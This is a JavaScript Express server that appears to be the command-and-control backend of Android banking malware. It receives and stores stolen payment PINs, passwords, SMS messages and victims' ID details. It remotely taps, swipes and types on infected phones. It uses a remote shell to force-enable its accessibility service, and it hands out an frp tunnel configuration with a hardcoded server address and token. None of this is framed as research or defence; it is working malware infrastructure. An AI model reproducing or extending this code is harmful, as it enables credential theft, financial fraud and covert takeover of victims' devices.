    cpuModel: cpus[0]?.model || 'Unknown',
    cpuUsage: 0,
    memTotal: totalMem,
    memUsed: usedMem,
    memFree: freeMem,
    memUsage: Math.round((usedMem / totalMem) * 100),
    diskTotal: diskTotal,
    diskUsed: diskUsed,
    diskFree: diskFree,
    diskUsage: diskTotal > 0 ? Math.round((diskUsed / diskTotal) * 100) : 0,
    netSendSpeed: 0,
    netRecvSpeed: 0,
    netBytesSent: 0,
    netBytesRecv: 0,
    hostname: os.hostname(),
    platform: os.platform() + ' ' + os.release(),
    hostUptime: Math.floor(os.uptime()),
    totalApks: 0,
    apkOutputSize: 0,
    apkDownloadCount: 0,
    totalAbPacks: 0,
    abPackOutputSize: 0
  }});
});

app.get('/api/license/max-users', authMiddleware, (req, res) => res.json({ success: true, data: { maxUsers: 999 } }));
app.get('/api/injection/counts', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const counts = {};
  for (const id of deviceIds) {
    const row = db.prepare("SELECT COUNT(*) as c FROM sms_notifications WHERE device_id=? AND type='injection'").get(id);
    counts[id] = row ? row.c : 0;
  }
  res.json({ success: true, counts });
});
app.get('/api/devices/crypto-wallets', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const result = {};
  for (const id of deviceIds) result[id] = [];
  res.json({ success: true, result });
});
app.get('/api/ip-geo/:ip', (req, res) => res.json({ success: true, data: { country: 'HK', countryName: 'Hong Kong', city: 'Hong Kong' } }));
app.get('/api/black-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/sensitive-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/payment-strategies', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.get('/api/password-inputs/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 20;
  const passwordType = req.query.passwordType || '';
  const offset = (page - 1) * pageSize;
  let whereClause = 'WHERE device_id=?';
  const params = [deviceId];
  if (passwordType && passwordType !== 'DEFAULT') {
    whereClause += ' AND password_type=?';
    params.push(passwordType);
  }
  const total = db.prepare(`SELECT COUNT(*) as c FROM password_inputs ${whereClause}`).get(...params).c;
  const rows = db.prepare(`SELECT * FROM password_inputs ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({ success: true, data: { passwords: rows.map(r => ({ id: r.id, deviceId: r.device_id, appName: r.app_name, packageName: r.package_name, password: r.input_text, value: r.input_text, inputText: r.input_text, type: r.password_type, passwordType: r.password_type, capturedAt: r.timestamp || Math.floor(r.created_at * 1000), date: r.timestamp || Math.floor(r.created_at * 1000), timestamp: r.timestamp || Math.floor(r.created_at * 1000), createdAt: r.created_at })), total, page, pageSize } });
});
app.get('/api/wechat-passwords/:deviceId', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 10;
  res.json({ success: true, data: { passwords: [], total: 0, page, pageSize } });
});
app.delete('/api/password-inputs/id/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE id=?').run(req.params.id);
  res.json({ success: true });
});
app.put('/api/password-inputs/id/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE password_inputs SET app_name=? WHERE id=?').run(remark || '', req.params.id);
  res.json({ success: true });
});
app.delete('/api/password-inputs/clear/:deviceId', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/payment-cipher-records', authMiddleware, (req, res) => {
  // 支付密码记录（由 payment_cipher_captured 事件写入，和普通密码记录分开）
  res.json({ success: true, data: [], total: 0 });
});
app.get('/api/settings/telegram', authMiddleware, (req, res) => res.json({ success: true, data: {} }));
app.get('/api/gesture/list', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.get('/api/gesture/records', authMiddleware, (req, res) => res.json({ success: true, data: [], total: 0 }));
app.post('/api/gesture/save', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/gesture/:id', authMiddleware, (req, res) => res.json({ success: true }));
app.post('/api/device-custom-info', authMiddleware, (req, res) => {
  const { deviceId, realName, idCard, expiryDate, otherInfo } = req.body || {};
  if (deviceId) {
    const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
    try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
    db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, deviceId);
  }
  res.json({ success: true });
});
app.get('/api/device-custom-info', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.json({ success: true, data: {} });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(deviceId);
  if (row && row.custom_info) {
    try { return res.json({ success: true, data: JSON.parse(row.custom_info) }); } catch {}
  }
  res.json({ success: true, data: { realName: '', idCard: '', expiryDate: '', otherInfo: '' } });
});

// 获取单个设备详情
app.get('/api/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
  if (!row) return res.json({ success: false, message: '设备不存在' });
  res.json({ success: true, data: deviceToListApi(row) });
});

// 获取设备 Bridge 状态
app.get('/api/bridge/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const isOnline = deviceConnections.has(deviceId) || bridgeConnections.has(deviceId);
  res.json({ success: true, online: isOnline, status: isOnline ? 'online' : 'offline' });
});

// 获取设备全局注入状态
app.get('/api/device/:deviceId/global-injection-status', authMiddleware, (req, res) => {
  res.json({ success: true, enabled: true, data: { enabled: true } });
});

// 设置设备备注
app.all('/api/device/:deviceId/remark', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const remark = req.body?.remark || req.query?.remark || '';
  db.prepare('UPDATE devices SET remark=? WHERE device_id=?').run(remark, deviceId);
  res.json({ success: true });
});

// 设备黑名单列表
app.get('/api/device/blacklist', authMiddleware, (req, res) => {
  res.json({ success: true, data: [] });
});

// 删除设备
app.delete('/api/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
  const ws = deviceConnections.get(deviceId);
  if (ws) { try { ws.close(); } catch(e){} deviceConnections.delete(deviceId); }
  db.prepare('DELETE FROM devices WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM sms_notifications WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(deviceId);
  broadcastToAdmins({ type: 'device_removed', deviceId, sessionId: deviceId });
  res.json({ success: true });
});

app.get('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(req.params.deviceId);
  if (row && row.custom_info) {
    try { const d = JSON.parse(row.custom_info); return res.json({ success: true, ...d }); } catch {}
  }
  res.json({ success: true, realName: '', idCard: '', expiryDate: '', otherInfo: '' });
});
app.post('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.put('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch {}
  const rows = db.prepare('SELECT * FROM device_groups ORDER BY id').all();
  res.json({ success: true, groups: rows.map(r => ({ id: r.id, name: r.name, deviceIds: (r.device_ids || '').split(',').filter(Boolean), createdAt: r.created_at })) });
});
app.post('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch {}
  const { name, deviceIds } = req.body || {};
  if (!name) return res.json({ success: false, message: '分组名不能为空' });
  const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
  db.prepare('INSERT INTO device_groups (name, device_ids) VALUES (?,?)').run(name, ids);
  res.json({ success: true, message: '分组创建成功' });
});
app.put('/api/device/groups/:id', authMiddleware, (req, res) => {
  const { name, deviceIds } = req.body || {};
  if (name) db.prepare('UPDATE device_groups SET name=? WHERE id=?').run(name, req.params.id);
  if (deviceIds !== undefined) {
    const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
    db.prepare('UPDATE device_groups SET device_ids=? WHERE id=?').run(ids, req.params.id);
  }
  res.json({ success: true });
});
app.delete('/api/device/groups/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM device_groups WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

// 文件管理（通过 frpc ADB shell 列出目录）
app.get('/api/file/list', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  let dirPath = req.query.path || '/sdcard';
  // 确保路径末尾有斜杠（避免符号链接问题）
  if (!dirPath.endsWith('/')) dirPath += '/';
  const http = require('http');
  const cmd = encodeURIComponent(`ls -la "${dirPath}"`);
  http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${cmd}`, { timeout: 10000 }, (proxyRes) => {
    const chunks = [];
    proxyRes.on('data', c => chunks.push(c));
    proxyRes.on('end', () => {
      try {
        const data = JSON.parse(Buffer.concat(chunks).toString());
        const output = data.data?.output || '';
        const files = output.split('\n').filter(l => l.trim() && !l.startsWith('total')).map(line => {
          const parts = line.trim().split(/\s+/);
          if (parts.length < 7) return null;
          const perms = parts[0] || '';
          const isDir = perms.startsWith('d');
          const size = parseInt(parts[4]) || 0;
          const dateStr = `${parts[5]} ${parts[6]}`;
          const name = parts.slice(7).join(' ').replace(/ ->.*$/, '');
          if (!name || name === '.' || name === '..') return null;
          const cleanPath = dirPath.replace(/\/+$/, '');
          return { name, isDirectory: isDir, size, permissions: perms, path: `${cleanPath}/${name}`, modifiedAt: dateStr };
        }).filter(Boolean);
        res.json({ success: true, files: files });
      } catch {
        res.json({ success: true, files: [] });
      }
    });
  }).on('error', () => res.json({ success: true, files: [] }));
});

// frpc 隧道配置（local-service 启动 frpc 时请求）
app.all('/api/tunnel/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7910;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `[common]\nserver_addr = 202.95.8.130\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`;
  res.json({
    success: true,
    data: {
      serverAddr: '202.95.8.130',
      serverPort: 7000,
      token: token,
      remotePort: remotePort,
      localPort: localPort,
      configINI: configINI
    }
  });
});

// 设备操作日志
app.get('/api/logs', authMiddleware, (req, res) => {
  const { deviceId, page, pageSize } = req.query;
  res.json({ success: true, data: { logs: [], total: 0, page: parseInt(page)||1, pageSize: parseInt(pageSize)||50 } });
});

// 短信/通知
app.get('/api/sms/notifications', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const offset = (page - 1) * pageSize;
  const total = db.prepare('SELECT COUNT(*) as c FROM sms_notifications').get().c;
  const rows = db.prepare('SELECT * FROM sms_notifications ORDER BY date DESC LIMIT ? OFFSET ?').all(pageSize, offset);
  res.json({
    success: true,
    data: {
      list: rows.map(r => ({
        id: r.id,
        address: r.address,
        body: r.body,
        date: r.date,
        deviceId: r.device_id,
        deviceName: r.device_name,
        serialNumber: r.serial_number,
        type: r.type
      })),
      page,
      pageSize,
      total
    }
  });
});

// 前端通过HTTP发送命令给设备（桥接到 Bridge 或 WebSocket）
app.post('/api/bridge/command/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const { command, params } = req.body || {};
  
  // 优先通过 Bridge（local-service）执行命令
  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    // 坐标不缩放：前端已经换算到设备实际分辨率
    // 动态计算 scale：从截图缓存读实际宽度
    let scale = 2; // 默认
    try {
      const devRow = db.prepare('SELECT screen_width FROM devices WHERE device_id=?').get(deviceId);
      const realW = devRow?.screen_width || 720;
      const cached = screenshotCache.get(deviceId);
      if (cached && cached.data && cached.data.length > 10) {
        // 解析 JPEG SOF0 获取宽度
        const buf = cached.data;
        for (let i = 0; i < buf.length - 9; i++) {
          if (buf[i] === 0xFF && (buf[i+1] === 0xC0 || buf[i+1] === 0xC2)) {
            const shotW = buf.readUInt16BE(i + 7);
            if (shotW > 0 && shotW < 10000) {
              scale = realW / shotW;
              break;
            }
          }
        }
      }
    } catch(e) { /* fallback scale=2 */ }
    let fixedParams = params || {};
    if (command === 'click' || command === 'tap') {
      if (fixedParams.x) fixedParams.x = Math.round(fixedParams.x * scale);
      if (fixedParams.y) fixedParams.y = Math.round(fixedParams.y * scale);
    }
    if (command === 'swipe') {
      if (fixedParams.startX) fixedParams.startX = Math.round(fixedParams.startX * scale);
      if (fixedParams.startY) fixedParams.startY = Math.round(fixedParams.startY * scale);
      if (fixedParams.endX) fixedParams.endX = Math.round(fixedParams.endX * scale);
      if (fixedParams.endY) fixedParams.endY = Math.round(fixedParams.endY * scale);
      // 前端也可能发 x1/y1/x2/y2 格式
      if (fixedParams.x1) fixedParams.x1 = Math.round(fixedParams.x1 * scale);
      if (fixedParams.y1) fixedParams.y1 = Math.round(fixedParams.y1 * scale);
      if (fixedParams.x2) fixedParams.x2 = Math.round(fixedParams.x2 * scale);
      if (fixedParams.y2) fixedParams.y2 = Math.round(fixedParams.y2 * scale);
    }
    
    // dumpUI 等需要返回数据的命令通过 frpc 端口请求
    if (command === 'dumpUI' || command === 'dumpHierarchy' || command === 'getUiHierarchy') {
      const http = require('http');
      const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/${command}`, { timeout: 15000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const data = Buffer.concat(chunks);
          if (!res.headersSent) { res.set('Content-Type', proxyRes.headers['content-type'] || 'application/json'); res.send(data); }
        });
      });
      proxyReq.on('error', (e) => { if (!res.headersSent) res.json({ success: false, message: e.message }); });
      proxyReq.on('timeout', () => { proxyReq.destroy(); if (!res.headersSent) res.json({ success: false, message: 'timeout' }); });
      return;
    }
    
    // 触摸/滑动/按键命令：直接通过 frpc HTTP 端口调用 local-service REST API（低延迟）
    if (command === 'click' || command === 'tap') {
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: tap (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'tap via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/tap?x=${fixedParams.x || 0}&y=${fixedParams.y || 0}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'tap executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 30000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'tap via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: tap raw=${JSON.stringify(params)} scaled=${fixedParams.x},${fixedParams.y} scale=${scale} (frpc)`);
      return;
    }
    
    if (command === 'swipe') {
      const x1 = fixedParams.startX || fixedParams.x1 || 0;
      const y1 = fixedParams.startY || fixedParams.y1 || 0;
      const x2 = fixedParams.endX || fixedParams.x2 || 0;
      const y2 = fixedParams.endY || fixedParams.y2 || 0;
      const duration = fixedParams.duration || 300;
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: swipe (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'swipe via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/swipe?x1=${x1}&y1=${y1}&x2=${x2}&y2=${y2}&duration=${duration}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'swipe executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 30000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'swipe via bridge' });
      });
      _req.on('timeout', () => { _req.destroy(); setFrpcCooldown(deviceId, 30000); });
      console.log(`[CMD] → ${deviceId}: swipe (frpc直连)`);
      return;
    }
    
    if (command === 'keyevent') {
      const keycode = fixedParams.keycode || fixedParams.keyCode || fixedParams.code || 0;
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'keyevent via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/keyevent?keycode=${keycode}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'keyevent executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 30000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'keyevent via bridge' });
      });
      _req.on('timeout', () => { _req.destroy(); setFrpcCooldown(deviceId, 30000); });
      console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (frpc直连)`);
      return;
    }
    
    if (command === 'text' || command === 'inputText') {
      const http = require('http');
      const text = encodeURIComponent(fixedParams.text || fixedParams.content || '');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/text?text=${text}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'text executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'text via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: text (frpc直连)`);
      return;
    }
    
    // 启用无障碍服务：通过 frpc shell 直接执行 settings put
    if (command === 'enableAccessibility' || command === 'restoreAccessibility') {
      const _http = require('http');
      const _port = getDevicePort(deviceId);
      const _devRow = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      const _pkg = _devRow && _devRow.app_name && _devRow.app_name.startsWith('com.') ? _devRow.app_name : null;
      if (_pkg) {
        const _svc = _pkg + '/com.titan.solid.luck.service.unfaiahnst';
        const _c = encodeURIComponent('settings put secure enabled_accessibility_services ' + _svc + ' && settings put secure accessibility_enabled 1');
        _http.get('http://127.0.0.1:' + _port + '/shell?cmd=' + _c, { timeout: 6000 }, function() {
          console.log('[CMD] a11y fast', deviceId, _svc);
          if (!res.headersSent) res.json({ success: true, data: { success: true, message: 'a11y enabled: ' + _svc } });
        }).on('error', function(e2) {
          if (!res.headersSent) res.json({ success: true, data: { success: false, message: e2.message } });
        });
        return;
      }

      const http = require('http');
      // 查询设备上的包名（从数据库获取或使用已知的）
      const device = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      // 先获取当前包名
      const getPkgCmd = encodeURIComponent('pm list packages -3 | grep -v google | grep -v android | grep -v vivo | grep -v baidu | grep -v tencent | grep -v taobao | grep -v sina | grep -v kuaishou | grep -v jingdong | grep -v xunmeng | grep -v smile | grep -v dragon | grep -v omron | grep -v unionpay | grep -v kaixinkan | grep -v xtc');
      http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${getPkgCmd}`, { timeout: 5000 }, (pkgRes) => {
        const chunks = [];
        pkgRes.on('data', c => chunks.push(c));
        pkgRes.on('end', () => {
          try {
            const pkgData = JSON.parse(Buffer.concat(chunks).toString());
            const output = pkgData.data?.output || '';
            // 找到我们的包（通常是 com.xxx.yyyyy 格式，14字符）
            const pkgs = output.split('\n').map(l => l.trim().replace('package:', '')).filter(p => p && p.startsWith('com.') && p.length <= 20);
            const ourPkg = pkgs[0] || 'com.dev.rehwft';
            const service = `${ourPkg}/com.titan.solid.luck.service.unfaiahnst`;
            
            // 执行 settings put
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              // 同时启用 accessibility_enabled
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => {}).on('error', () => {});
              console.log(`[CMD] ✅ ${deviceId}: 无障碍已启用 (${service})`);
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', (e) => {
              console.log(`[CMD] ❌ ${deviceId}: 启用无障碍失败 - ${e.message}`);
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: e.message } });
            });
          } catch (e) {
            // 回退：直接用已知的包名
            const service = 'com.dev.rehwft/com.titan.solid.luck.service.unfaiahnst';
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => {}).on('error', () => {});
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', () => {
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: '启用失败' } });
            });
          }
        });
      }).on('error', () => {
        // frpc 不可用，回退到 Bridge
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, data: { success: true, message: '命令已发送(Bridge)' } });
      });
      return;
    }
    
    // APP 级别命令（大写命令）通过 APP WebSocket 转发
    if (command === command.toUpperCase() && command.length > 3) {
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: fixedParams } }));
        console.log(`[CMD] → ${deviceId}: ${command} (APP WS via HTTP)`);
        return res.json({ success: true, message: '命令已发送(APP)' });
      }
    }
    
    // 其他命令通过 Bridge WS 转发
    bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
    console.log(`[CMD] → ${deviceId}: ${command} (Bridge)`);
    return res.json({ success: true, message: '命令已发送(Bridge)' });
  }
  
  // 回退：通过 APP WebSocket
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: params || {} } }));
    console.log(`[CMD] → ${deviceId}: ${command} (WS)`);
    res.json({ success: true, message: '命令已发送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// local-service 相关接口（通过WebSocket隧道访问APP本地ADB服务）
// 截图缓存
app.get('/api/auth/check-initialization', (req, res) => {
  const row = db.prepare('SELECT COUNT(*) as cnt FROM users').get();
  res.json({ success: true, data: { initialized: row.cnt > 0 } });
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body || {};
  const user = db.prepare('SELECT * FROM users WHERE username=?').get(username);
  db.prepare('INSERT INTO login_logs (username,ip,success) VALUES (?,?,?)').run(username, req.ip, user ? 1 : 0);
  if (!user || !bcrypt.compareSync(password || '', user.password_hash)) {
    return res.status(401).json({ success: false, message: '用户名或密码错误' });
  }
  const token = jwt.sign({ userId: user.id, username: user.username, role: user.role, isSuper: !!user.is_super }, SECRET_KEY, { expiresIn: '30d' });
  res.json({ success: true, data: { token, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, avatar: user.avatar, maxDevices: user.max_devices } } });
});

app.post('/api/auth/verify', (req, res) => {
  const token = req.body?.token || req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,created_at FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });
    res.json({ success: true, data: { valid: true, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, maxDevices: user.max_devices, createdAt: Math.floor(user.created_at || 0) } } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// ============================================================
// 设备 API（APP 客户端调用）
// ============================================================
app.post('/api/client/register', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少deviceId' });
  const now = Date.now() / 1000;
  const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
  if (existing) {
    db.prepare('UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,public_ip=?,is_connected=1,last_seen=? WHERE device_id=?')
      .run(data.brand||'', data.model||'', data.osVersion||'', data.appVersion||'', req.ip, now, deviceId);
  } else {
    db.prepare('INSERT INTO devices (device_id,brand,model,os_version,app_version,public_ip,screen_width,screen_height,is_connected,last_seen) VALUES (?,?,?,?,?,?,?,?,1,?)')
      .run(deviceId, data.brand||'', data.model||'', data.osVersion||'', data.appVersion||'', req.ip, data.screenWidth||0, data.screenHeight||0, now);
  }
  res.json({ success: true, message: '设备注册成功', data: { deviceId } });
});

app.post('/api/client/logs', (req, res) => {
  // APP 上报操作日志，转发给管理端
  const { deviceId, logs } = req.body || {};
  if (deviceId && logs && Array.isArray(logs)) {
    for (const log of logs) {
      broadcastToAdmins({
        type: 'operation_log_realtime',
        sessionId: deviceId,
        data: { deviceId, log },
        botId: deviceId
      });
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/status', (req, res) => {
  const { deviceId, batteryLevel, networkType } = req.body || {};
  if (deviceId) {
    const now = Date.now() / 1000;
    const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
    if (existing) {
      db.prepare('UPDATE devices SET battery_level=?,network_type=?,is_connected=1,last_seen=? WHERE device_id=?').run(batteryLevel||0, networkType||'', now, deviceId);
    } else {
      db.prepare('INSERT INTO devices (device_id,battery_level,network_type,public_ip,is_connected,last_seen) VALUES (?,?,?,?,1,?)').run(deviceId, batteryLevel||0, networkType||'', req.ip, now);
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/messages', (req, res) => res.json({ success: true }));
app.post('/api/sync/inbox', (req, res) => res.json({ success: true }));
app.post('/api/sync/cipher', (req, res) => {
  // 支付密码上报
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  console.log(`[CIPHER] 收到支付密码: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId && (data.cipher || data.password || data.value)) {
    const text = data.cipher || data.password || data.value || '';
    const appName = data.appName || data.app || 'payment';
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, appName, data.packageName || '', text, 'payment_cipher', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/credentials', (req, res) => {
  // 凭据上报
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  console.log(`[CRED] 收到凭据: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId) {
    const text = data.password || data.value || data.credential || JSON.stringify(data);
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, data.appName || data.app || '', data.packageName || '', text, data.type || 'credential', data.timestamp || Date.now());
